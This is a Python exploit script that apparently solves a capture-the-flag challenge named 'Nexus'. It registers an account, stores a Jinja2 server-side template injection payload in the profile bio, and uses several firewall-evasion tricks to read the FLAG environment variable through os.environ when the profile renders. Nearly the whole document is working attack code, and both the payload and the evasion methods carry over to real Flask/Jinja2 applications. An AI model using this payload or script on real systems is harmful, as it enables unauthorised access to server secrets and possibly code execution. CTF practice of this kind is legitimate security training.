"""
Nexus CTF Exploit — SSTI via bio field with WAF bypass

Steps:
  1. Register a new account
  2. Set bio to a Jinja2 SSTI payload that bypasses the WAF
  3. Visit own profile to trigger render_template_string() on the bio
  4. Extract the flag from the rendered HTML

WAF bypasses used:
  - {%print(...)%} instead of {{...}}  (WAF blocks {{ but not {%)
  - String concat to split dunders:  "__ini"+"t__", "__glo"+"bals__"
  - joiner (unblocked Jinja2 global) instead of lipsum/cycler/namespace
  - Dict subscript ["os"]["environ"] instead of os.environ (dodges regex)
"""

import requests
import re
import sys
import random
import string

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:5000"

s = requests.Session()

# 1. Register a fresh user
username = "exploit_" + "".join(random.choices(string.ascii_lowercase, k=6))
password = "password123"

print(f"[*] Registering user: {username}")
r = s.post(f"{BASE}/register", data={
    "username": username,
    "password": password,
})
assert r.status_code == 200, f"Registration failed: {r.status_code}"
print("[+] Registered and logged in")

# 2. Set bio to SSTI payload
payload = '{%print(joiner[("__ini"+"t__")][("__glo"+"bals__")]["os"]["environ"]["get"]("FLAG"))%}'

print(f"[*] Setting bio to SSTI payload")
r = s.post(f"{BASE}/settings", data={
    "tab": "profile",
    "bio": payload,
    "website": "",
})
assert r.status_code == 200, "Settings update failed"
print("[+] Bio updated (WAF bypassed)")

# 3. Visit own profile to trigger rendering
print("[*] Fetching profile to trigger SSTI...")
r = s.get(f"{BASE}/profile/{username}")
assert r.status_code == 200, f"Profile fetch failed: {r.status_code}"

# 4. Extract flag from rendered bio
match = re.search(r"<p class='bio-text'>(.*?)</p>", r.text)
if match:
    flag = match.group(1).strip()
    if flag and flag != "None":
        print(f"[+] FLAG: {flag}")
    else:
        print("[-] SSTI executed but FLAG env var is not set (got None)")
        print("    Make sure the container was started with -e FLAG=CTF{...}")
else:
    print("[-] Could not find bio block in response")
    print("[*] Dumping relevant HTML for debugging:")
    bio_match = re.search(r"bio-block.*?</div>", r.text, re.DOTALL)
    if bio_match:
        print(bio_match.group(0))
